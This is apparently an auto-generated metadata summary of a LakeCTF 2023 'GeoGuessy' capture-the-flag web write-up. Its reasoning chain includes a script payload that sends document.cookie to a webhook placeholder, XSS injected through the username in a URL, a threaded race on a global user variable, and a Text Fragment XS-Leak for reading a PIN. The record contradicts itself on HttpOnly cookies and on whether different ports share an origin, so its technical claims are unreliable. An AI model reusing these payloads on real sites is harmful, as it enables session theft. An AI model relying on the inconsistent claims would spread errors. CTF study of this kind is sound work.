...
vuln_type: logic
tags:
- dompurify_xss_bypass
- html_injection_username
- race_condition_global_user
- premium_pin_registration
- bfcache_text_fragment
- xs_leak_anchor_text
- lazy_loading_image_scroll
- cookie_steal_xss
- javascript_username_in_dom
...
quality: high
full_path: XSS,_Race_Condition,_XS-Leaks_and_CSP_&_iframe’s_sandbox_bypass_–_LakeCTF_2023_G.full.md
meta_path: XSS,_Race_Condition,_XS-Leaks_and_CSP_&_iframe’s_sandbox_bypass_–_LakeCTF_2023_G.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: XSS, Race Condition, XS-Leaks and CSP & iframe's sandbox bypass – LakeCTF 2023 GeoGuessy。LakeCTF 2023 GeoGuessy 三种 premium 取法：同域 9009 反射 XSS 跨端口 + 全局 user 变量 race condition 注册覆盖 + 预期解 XS-Leaks 锚文本懒...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/146539.html
wp_author: the
reasoning_chain:
- 触发点:GeoGuessy 端口 9011 主服务 + 9009 同域另一个 HTTP 端口 → 假设:同源策略绕过 → 动作:http://<script>alert(document.cookie)</script>:pass@chall.polygl0ts.ch:9009
- 观察:9009 是反射型 XSS,能跑 script → 下一步:用户名注入 [Click here to play!] 链接 → 触发 admin bot cookie 外带
- '动作:urllib.parse.quote_plus(f"<script>fetch(''{WEBHOOK}?''.concat(document.cookie))</script>") → 观察:admin bot 30s 内点击触发 → 完成 unintended #1'
- '触发点:unintended #2 走 race condition → 假设:全局 user 变量并发改 → 动作:30 路 threading 并发 register_and_check'
- 观察:某路请求把 user 改成我们注册的用户 → 下一步:用 premium PIN 注册覆盖
- 触发点:intended 解走 XS-Leaks → 假设:锚文本 + 懒加载图 + bfcache + Text Fragment 可字符级探 → 动作:Text Fragment https://example.com#:~:text=prefix-textStart,textEnd,-suffix
- 动作:16 iframe 滚动判断 PIN 数字 → 观察:逐字符泄漏 premium PIN → 完成
failed_attempts:
- 试图用 <iframe> 跨域 → 失败:同源策略严格
- 试图用 XSS 直接读 cookie → 失败:HttpOnly flag 设了
- 试图单次 XS-Leaks → 失败:字符级探测必须 16 iframe 滚动
key_observations:
- 同一域名不同端口是 '同源策略绕过' 的常见盲点
- 全局变量在 Node.js Express 多请求 race condition 是云函数 + 共享内存模型的常见漏洞模式
- Text Fragment (https://...#:~:text=) + 锚文本滚动是字符级 XS-Leak 的现代手法
- admin bot 30s 窗口期需要预加载 leak endpoint
- CORS 同源策略只看 scheme + host + port,不同端口算不同源
prerequisites:
- CSP 指令详解 (script-src / style-src / frame-src / object-src)
- XS-Leaks + Text Fragment + 懒加载图原理
- Puppeteer / Chrome DevTools Protocol
- Node.js Express 全局变量并发漏洞模式
---
